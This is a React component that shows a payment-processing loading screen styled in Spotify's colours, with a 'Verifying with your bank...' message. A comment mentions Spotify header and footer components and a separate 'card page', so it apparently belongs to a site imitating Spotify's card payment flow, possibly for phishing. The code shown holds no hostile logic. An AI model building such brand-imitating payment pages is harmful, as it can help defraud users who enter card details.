"use client"

import { t, type Language } from "@/lib/translations"
// Removed SpotifyHeader and SpotifyFooter as per user request to only show on card page

interface PaymentProcessingProps {
  language?: Language
}

export function PaymentProcessing({ language = "en" }: PaymentProcessingProps) {
  return (
    <div className="flex flex-col min-h-screen w-full bg-[#121212]">
      <main className="flex-1 flex flex-col items-center justify-center py-12">
        <div className="w-full max-w-[400px] mx-auto flex flex-col items-center justify-center px-4">
          <div className="text-center">
            <h1 className="text-2xl sm:text-[32px] font-bold text-white mb-8">{t("processing.title", language)}</h1>

            {/* Green Loading Circle */}
            <div className="flex justify-center mb-8">
              <div className="w-16 h-16 rounded-full border-4 border-[#1ed760]/20 border-t-[#1ed760] animate-spin"></div>
            </div>

            <p className="text-[#a7a7a7] text-sm sm:text-lg">{t("processing.message", language)}</p>
            <p className="text-[#1ed760] text-xs mt-4 animate-pulse">Verifying with your bank...</p>
          </div>
        </div>
      </main>

    </div>
  )
}
